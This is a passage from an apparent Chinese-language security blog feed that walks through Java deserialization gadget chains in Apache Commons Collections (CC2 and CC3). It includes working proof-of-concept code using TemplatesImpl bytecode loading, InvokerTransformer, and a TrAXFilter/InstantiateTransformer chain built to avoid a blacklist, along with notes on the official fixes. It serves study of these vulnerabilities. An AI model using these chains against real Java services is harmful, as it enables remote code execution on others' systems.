class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getBytescode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(obj);<br>        queue.add(obj);<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="官方修复方法"><a href="#官方修复方法" class="headerlink" title="官方修复方法"></a>官方修复方法</h2><ul><li>PriorityQueue的利用链是否支持在CC3中利用?</li><li>Apache Commons Collections官方如何修复漏洞</li></ul><p>第一个不行，因为TransformingComparator没有实现serializable接口</p><p>第二个问题在CC3版本下增加了一个方法<code>FunctorUtils#checkUnsafeSerialization</code> ，⽤于检测反序列化是否安全。如果开发者没有设置全局配置 <code>org.apache.commons.collections.enableUnsafeSerialization=true</code> ，即默认情况下会抛出异常。</p><p>这个检查在常⻅的危险Transformer类</p><p>（ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransformer 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191237655.png" alt="image-20230220195203458"> </p><p>而在CC4版本中，上面的危险Transformer类不实现Serializable接口，也就是说他们完全无法序列化和反序列化了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CC3</title>
    <link href="/decemberus.com/2022/11/10/CC3(2)/"/>
    <url>/decemberus.com/2022/11/10/CC3(2)/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p><code>TemplatesImpl</code>是一个可以加载字节码的类，通过调用<code>newTransformer()</code>方法，即可执行这段字节码的类构造器，那么尝试再反序列化中利用这个特性执行任意代码</p><p>利用TemplatesImpl执行字节码的办法是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span>  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        obj.newTransformer();<span class="hljs-comment">//调用newTransformer来触发漏洞</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而下面是CC1利用<code>transformMap</code>执行任意方法的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结合这两段poc，可以改造出执行任意字节码的CC利用链，只需要改变第二个demo中的<code>InvokerTranformer</code>的方法改为<code>newTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(obj),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>解释一下这里改为newTransformer的意义</p><p>通过创建一个名为InvokerTransformer的对象并调用其中的“newTransformer()”方法，可以生成一个能够执行Transformer对象的实例</p><p>这个方法将返回一个新的Transformer对象，它可以对输入的XML文档进行转换。这个新的Transformer对象被用来作为恶意代码中的常量，用于构建一个Transformer[]数组。</p></blockquote><p>改造后如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span>  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(obj),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br> &#125;;<br> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br><span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191237794.png" alt="image-20230216213233419"> </p><p>但现在的代码和CC3仍然不同，CC3没有用到<code>InvokerTransformer</code></p><p>因为<code>InvokerTransformer</code>被某种工具加入了黑名单，所以我们不能够使用这个方法，而是应该用到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><p>这个类中调用了<code>(TransformerImpl) templates.newTransformer()</code> ，免去了我们使⽤<code>InvokerTransformer</code>⼿⼯调⽤ <code>newTransformer()</code> ⽅法这⼀步</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191237189.png" alt="image-20230217162413033"> </p><p>但很明显我们无法调用构造方法，总不能实例化一个对象去调用吧，于是我们使用<code>org.apache.commons.collections.functors.InstantiateTransformer</code>这个类，它实现了Transformer接口，作用是调用构造方法</p><p>于是利用链有了</p><p>利用<code>InstantiateTransformer</code>调用<code>TrAXFilter</code>的构造方法，再利用构造方法里面的<code>templates.newTransformer</code>调用<code>TemplatesImpl</code>里面的字节码</p><p>于是我们的利用链是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="hljs-comment">// 创建一个 ConstantTransformer，将 TrAXFilter 类作为常量值传递</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;)<span class="hljs-comment">// 创建一个 InstantiateTransformer，用于实例化 TemplatesImpl 对象,如此一来就可以调用构造方法来调用transform方法了</span><br>&#125;;<br>        &#125;;<br></code></pre></td></tr></table></figure><p>替换到前面的demo中，发现成功运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span 